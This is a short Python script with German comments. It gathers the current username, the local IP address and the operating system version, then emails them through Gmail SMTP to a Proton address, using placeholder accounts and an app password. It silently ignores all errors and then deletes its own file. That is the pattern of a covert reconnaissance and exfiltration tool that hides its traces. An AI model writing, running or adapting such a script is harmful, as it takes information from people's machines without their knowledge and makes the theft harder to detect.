import platform # Informationen über Betriebssystem
import socket # Netzwerkfunktionen
import getpass # Zugriff auf den eingeloggten Benutzernamen
import smtplib # Mailversand über SMTP
import os # Zugriff auf das Betriebssystem
from email.message import EmailMessage # Einfaches Format für strukturierte E-Mails

user = getpass.getuser() # Holt den aktuellen Benutzernamen, der gerade angemeldet ist
ip = socket.gethostbyname(socket.gethostname()) # Holt die lokale IP-Adresse des Geräts
os_info = f"{platform.system()} {platform.release()}" # Holt das Betriebssystem und die Version

msg = EmailMessage() # Erstellt ein neues E-Mail-Objekt im richtigen Format
msg['Subject'] = 'System Info' # E-Mail-Betreff
msg['From'] = 'xyz@gmail.com' # Absender
msg['To'] = 'xyz@proton.me' # Empfänger
msg.set_content(f'''
Benutzername: {user}
IP-Adresse: {ip}
Betriebssystem: {os_info}
''') # Fügt den Inhalt der E-Mail ein

try: 
    with smtplib.SMTP('smtp.gmail.com', 587) as smtp: # smtp.gmail.com, Port 587 (mit TLS-Verschlüsselung)
        smtp.starttls() # Baut eine Verbindung zu Gmails SMTP-Server auf
        smtp.login('xyz@gmail.com', 'wxyz wxyz wxyz wxyz') # Loggt sich ein mit der Adresse + App-Passwort
        smtp.send_message(msg) # Sendet die E-Mail
except: 
    pass # # Ignoriert alle Fehler und ohne Ausgabe

try:
    os.remove(__file__) # Löscht das aktuell laufende Skript
except:
    pass
